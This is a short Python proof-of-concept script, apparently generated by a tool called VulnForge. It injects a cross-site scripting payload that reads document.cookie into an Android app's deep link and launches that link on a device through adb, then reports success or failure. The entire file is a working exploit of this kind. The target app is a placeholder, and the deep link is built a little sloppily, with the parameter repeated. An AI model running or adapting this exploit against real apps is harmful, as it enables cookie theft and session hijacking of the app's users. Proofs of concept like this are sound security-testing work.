#!/usr/bin/env python3
"""
VulnForge - XSS PoC
Vulnerability: XSS via Deep Link
Location: myapp://test?param=value
"""
import subprocess

def exploit():
    # XSS payload
    payload = '<script>alert(document.cookie)</script>'
    
    # Deep link with XSS
    deep_link = f"myapp://test?param=value?param={payload}"
    
    # Launch app with malicious deep link
    cmd = ['adb', 'shell', 'am', 'start', '-a', 
           'android.intent.action.VIEW', '-d', deep_link]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] PoC SUCCESSFUL!")
        print(f"[+] XSS payload delivered via: {deep_link}")
        print("[+] Check app for JavaScript execution")
        return True
    else:
        print("[-] PoC failed")
        return False

if __name__ == "__main__":
    success = exploit()
    exit(0 if success else 1)
